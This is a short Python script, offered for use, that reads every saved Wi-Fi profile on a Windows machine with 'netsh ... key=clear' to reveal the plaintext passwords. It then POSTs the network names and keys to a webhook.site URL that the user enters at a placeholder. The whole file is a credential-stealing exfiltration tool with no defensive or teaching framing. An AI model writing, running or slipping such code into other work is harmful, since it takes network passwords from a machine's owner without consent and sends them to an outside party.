import subprocess
import requests

# Function to run a command and return the output
def run_command(command):
    return subprocess.run(command, capture_output=True, text=True, shell=True).stdout.strip()

# Retrieve Wi-Fi profile names
profiles_output = run_command(["netsh", "wlan", "show", "profiles"])
profile_names = [line.split(":")[1].strip() for line in profiles_output.splitlines() if "All User Profile" in line]

# Retrieve Wi-Fi profile information including passwords
wifi_info = {}
for profile_name in profile_names:
    profile_info = run_command(["netsh", "wlan", "show", "profile", profile_name, "key=clear"])
    key_content = ""
    for line in profile_info.splitlines():
        if "SSID name" in line:
            ssid = line.split(":")[1].strip()
        elif "Key Content" in line:
            key_content = line.split(":")[1].strip()
    wifi_info[ssid] = key_content

# Prepare data to send to the webhook
payload = {'profiles': '\n'.join([f"\nSSID: {ssid}\nKey Content: {key_content}\n" for ssid, key_content in wifi_info.items()])}

# Send data through Webhook.site
response = requests.post('ENTER YOUR webhook.site URL HERE', data=payload) # Enter your webhook.site URL Here

print(response.text)  # Print the response from the webhook
